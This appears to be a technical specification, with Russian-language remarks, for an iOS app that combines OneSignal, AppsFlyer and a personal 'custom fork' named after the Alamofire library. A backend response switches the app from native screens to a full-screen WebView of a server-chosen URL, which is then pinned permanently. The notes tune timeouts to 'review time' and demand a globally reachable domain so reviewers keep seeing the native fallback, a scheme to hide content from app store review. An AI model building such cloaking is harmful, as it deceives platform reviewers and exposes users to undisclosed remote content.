# black

# Technical Specification: Alamofire Logic + OneSignal + AppsFlyer Integration

---

## 1. Dependencies (SPM)

| Package                 | Repository                                                  | Version          |
| ----------------------- | ----------------------------------------------------------- | ---------------- |
| Alamofire (custom fork) | https://github.com/oksanadv393-boter23/Alamofire            | branch: `master` |
| OneSignal               | `https://github.com/OneSignal/OneSignal-XCFramework`        | `5.5.0+`         |
| AppsFlyer               | `https://github.com/AppsFlyerSDK/AppsFlyerFramework-Static` | `6.17.9+`        |

**Target Assignment:**

- Main app: `Alamofire`, `OneSignalFramework`, `OneSignalInAppMessages`, `AppsFlyerLib-Static`
- NSE target: `OneSignalExtension`

---

## 2. Files to Create/Modify

| File                                     | Action                |
| ---------------------------------------- | --------------------- |
| `App/AppDelegate.swift`                  | Create                |
| `Services/AppTrackingAuthorizationService.swift` | Create          |
| `App/{AppName}App.swift`                 | Modify                |
| `Info.plist` (main app)                  | Modify                |
| `OneSignalNotificationServiceExtension/` | Create target + files |
| `*.entitlements` (both targets)          | Configure App Groups  |

---

## 3. Info.plist Configuration

```xml
<key>NSUserTrackingUsageDescription</key>
<string>We use this identifier to personalize your experience and measure app performance.</string>

<key>NSAdvertisingAttributionReportEndpoint</key>
<string>https://appsflyer-skadnetwork.com/</string>

<key>AttributionCopyEndpoint</key>
<string>https://appsflyer-skadnetwork.com/</string>

<key>OneSignal_app_groups_key</key>
<string>group.{BUNDLE_ID}.onesignal</string>

<key>UIBackgroundModes</key>
<array>
    <string>remote-notification</string>
</array>
```

---

## 4. Entitlements

**Both targets (app + NSE):**

```xml
<key>com.apple.security.application-groups</key>
<array>
    <string>group.{BUNDLE_ID}.onesignal</string>
</array>

<key>aps-environment</key>
<string>development</string>  <!-- or "production" -->
```

---

## 5. AppDelegate.swift

```swift
import UIKit
import AppsFlyerLib
import OneSignalFramework
import Alamofire

final class AppDelegate: NSObject, UIApplicationDelegate {
    
    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        // 1. Configure API base URL
        AppConfiguration.serverBaseURL = "https://{API_DOMAIN}"
        
        // 2. Configure AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = "{APPSFLYER_DEV_KEY}"
        AppsFlyerLib.shared().appleAppID = "{APPLE_APP_ID}"  // without "id" prefix
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        
        // 3. Configure OneSignal
        OneSignal.initialize("{ONESIGNAL_APP_ID}", withLaunchOptions: launchOptions)
        OneSignal.Notifications.requestPermission({ _ in }, fallbackToSettings: false)
        
        // 4. Register for remote notifications
        application.registerForRemoteNotifications()
        
        // 5. Subscribe to didBecomeActive for AppsFlyer start
        NotificationCenter.default.addObserver(
            self, selector: #selector(applicationDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification, object: nil
        )
        
        return true
    }
    
    @objc private func applicationDidBecomeActive() {
        AppsFlyerLib.shared().start()
    }
}
```

> **Не вызывать `requestTrackingAuthorization` в `didBecomeActive`.** SDK ждёт ATT через `waitForATTUserAuthorization(60)`; prompt показывается отдельно в онбординге.

---

## 5a. AppTrackingAuthorizationService.swift

```swift
import AppTrackingTransparency
import Foundation

enum AppTrackingAuthorizationService {
    private static var didStartRequest = false

    @MainActor
    static func requestAuthorizationIfNeeded() async {
        guard !didStartRequest else { return }
        didStartRequest = true

        try? await Task.sleep(nanoseconds: 500_000_000)

        await withCheckedContinuation { continuation in
            ATTrackingManager.requestTrackingAuthorization { _ in
                continuation.resume()
            }
        }
    }
}
```

Вызвать при завершении онбординга **или при первом показе WebView** (`rootView.task`).

---

## 6. Main App Struct

```swift
import SwiftUI
import Alamofire
import OneSignalFramework

@main
struct {AppName}App: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @State private var isInitializing = true
    @State private var displayMode: Alamofire.DisplayMode = .loading
    @State private var webContentURL: String?

    var body: some Scene {
        WindowGroup {
            rootView
                .onAppear { performRegistration() }
        }
    }
    
    @ViewBuilder
    private var rootView: some View {
        ZStack {
            if isInitializing {
                // Loading screen
            } else if displayMode == .webContent, let url = webContentURL {
                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
                ZStack {
                    Color.black.ignoresSafeArea()
                    Alamofire.WebContentView(url: fullURL)
                }
                .preferredColorScheme(.dark)
            } else {
                // Native app content
            }
        }
    }
    
    private func performRegistration() {
        let pushToken = OneSignal.User.pushSubscription.token ?? ""

        if let saved = Alamofire.DataCache.shared.contentURL, !saved.isEmpty {
            finishLaunch(mode: .webContent, url: saved)
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            finishLaunch(mode: .nativeInterface, url: nil)
        }

        Alamofire.NetworkService.shared.performRegistration(pushToken: pushToken) { mode, url in
            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
        }
    }

    private func finishLaunch(mode: Alamofire.DisplayMode, url: String?) {
        guard isInitializing else { return }
        displayMode = mode
        webContentURL = url
        isInitializing = false
    }
}
```

> ⚠️ **Загрузочный экран — это always-resolving состояние с клиентским таймаутом, а не ожидание сети.** `isInitializing` обязан сниматься по watchdog-таймеру (≤5с) независимо от ответа бэкенда.
>
> ⚠️ **Sticky URL имеет приоритет над watchdog.** Если ссылка уже сохранена в `DataCache`, она показывается сразу на старте.

---

## 7. OneSignal Notification Service Extension

**Target name:** `OneSignalNotificationServiceExtension`

**NotificationService.swift:**

```swift
import UserNotifications
import OneSignalExtension

class NotificationService: UNNotificationServiceExtension {
    var contentHandler: ((UNNotificationContent) -> Void)?
    var receivedRequest: UNNotificationRequest!
    var bestAttemptContent: UNMutableNotificationContent?

    override func didReceive(_ request: UNNotificationRequest,
                             withContentHandler contentHandler: @escaping (UNNotificationContent) -> Void) {
        self.receivedRequest = request
        self.contentHandler = contentHandler
        self.bestAttemptContent = request.content.mutableCopy() as? UNMutableNotificationContent

        if let bestAttemptContent = bestAttemptContent {
            OneSignalExtension.didReceiveNotificationExtensionRequest(
                self.receivedRequest, with: bestAttemptContent, withContentHandler: self.contentHandler
            )
        }
    }

    override func serviceExtensionTimeWillExpire() {
        if let contentHandler = contentHandler, let bestAttemptContent = bestAttemptContent {
            OneSignalExtension.serviceExtensionTimeWillExpireRequest(
                self.receivedRequest, with: self.bestAttemptContent
            )
            contentHandler(bestAttemptContent)
        }
    }
}
```

**Info.plist (NSE):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>NSExtension</key>
    <dict>
        <key>NSExtensionPointIdentifier</key>
        <string>com.apple.usernotifications.service</string>
        <key>NSExtensionPrincipalClass</key>
        <string>$(PRODUCT_MODULE_NAME).NotificationService</string>
    </dict>
    <key>OneSignal_app_groups_key</key>
    <string>group.{BUNDLE_ID}.onesignal</string>
</dict>
</plist>
```

---

## 8. Initialization Order

```
┌─────────────────────────────────────────────────────────────────┐
│                    didFinishLaunchingWithOptions                │
├─────────────────────────────────────────────────────────────────┤
│ 1. AppConfiguration.serverBaseURL = "{API_DOMAIN}"              │
│ 2. AppsFlyer: devKey, appleAppID, waitForATTUserAuthorization   │
│ 3. OneSignal.initialize()                                       │
│ 4. registerForRemoteNotifications()                             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    applicationDidBecomeActive                   │
├─────────────────────────────────────────────────────────────────┤
│ AppsFlyerLib.shared().start()                                   │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    Onboarding finish                            │
├─────────────────────────────────────────────────────────────────┤
│ AppTrackingAuthorizationService.requestAuthorizationIfNeeded()  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                         App.onAppear                            │
├─────────────────────────────────────────────────────────────────┤
│ 1. Get push token: OneSignal.User.pushSubscription.token        │
│ 2. NetworkService.shared.performRegistration(pushToken:)        │
│ 3. Handle result: displayMode + webContentURL                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. Registration API

**Endpoint:** `POST {API_DOMAIN}/api/v1/users/register`

**Request:**

```json
{
  "bundle": "com.example.app",
  "push_token": "optional_onesignal_token"
}
```

**Response:**

```json
{
  "success": true,
  "app_data": "https://example.com/content"
}
```

**Logic:**

Нет сохранённой ссылки в `DataCache`:

| Response                                | DisplayMode        | UI         |
| --------------------------------------- | ------------------ | ---------- |
| `success: true` + `app_data` present    | `.webContent`      | WebView    |
| `success: true` + `app_data` null/empty | `.nativeInterface` | Native app |
| `success: false` or network error       | `.nativeInterface` | Native app |
| timeout / domain unreachable / blocked  | `.nativeInterface` | Native app |

Ссылка уже сохранена в `DataCache` — **всегда WebView**:

| Response                                | DisplayMode   | UI                        |
| --------------------------------------- | ------------- | ------------------------- |
| `app_data` present (новый URL)          | `.webContent` | WebView (URL обновляется) |
| `app_data` null/empty / `success:false` | `.webContent` | WebView (сохранённый URL) |
| timeout / domain unreachable / blocked  | `.webContent` | WebView (сохранённый URL) |

**Таймауты (обязательно):**

- `AppConfiguration.networkTimeout` = **8–10с**
- UI-watchdog (5с) срабатывает раньше сетевого таймаута
- Любая ошибка без сохранённой ссылки → `.nativeInterface`
- При наличии сохранённой ссылки любая ошибка → `.webContent` со старым URL

---

## 10. Required Parameters

| Parameter             | Description                                                 | Location                 |
| --------------------- | ----------------------------------------------------------- | ------------------------ |
| `{APPSFLYER_DEV_KEY}` | AppsFlyer dev key                                           | AppDelegate              |
| `{APPLE_APP_ID}`      | App Store ID (without "id" prefix)                          | AppDelegate              |
| `{ONESIGNAL_APP_ID}`  | OneSignal App ID (UUID format)                              | AppDelegate              |
| `{API_DOMAIN}`        | Backend API domain (глобально доступен, без гео-блокировок) | AppDelegate              |
| `{BUNDLE_ID}`         | App bundle identifier                                       | Entitlements, Info.plist |

---

## 11. Important Notes

1. **ATT отдельно от `start()`** — `waitForATTUserAuthorization(60)` в `didFinishLaunching`, `start()` на `didBecomeActive`, ATT prompt в онбординге через `AppTrackingAuthorizationService`. Не дублировать ATT в `didBecomeActive`.
2. **Sticky URL (КРИТИЧНО)** — как только сервер хоть раз вернул непустой `app_data`, ссылка сохраняется и при каждом запуске открывается именно она.
3. **WebView safe area** — wrap in `ZStack { Color.black.ignoresSafeArea() }` + `.preferredColorScheme(.dark)`
4. **NSE App Group** — must match main app's App Group for OneSignal confirmed delivery and rich notifications
5. **SKAN postbacks** — `NSAdvertisingAttributionReportEndpoint` + `AttributionCopyEndpoint` в Info.plist (оба → `https://appsflyer-skadnetwork.com/`)
6. **UI-watchdog обязателен** — лоадер снимается по таймеру (≤5с) независимо от сети
7. **Домен недоступен ≠ зависание** — блокировка / таймаут → fallback на `.nativeInterface`
8. **Клиентский таймаут < времени ревью** — `networkTimeout` 8–10с, watchdog 5с
9. **`{API_DOMAIN}` без гео-блокировок** — иначе ревью из других стран увидит native fallback
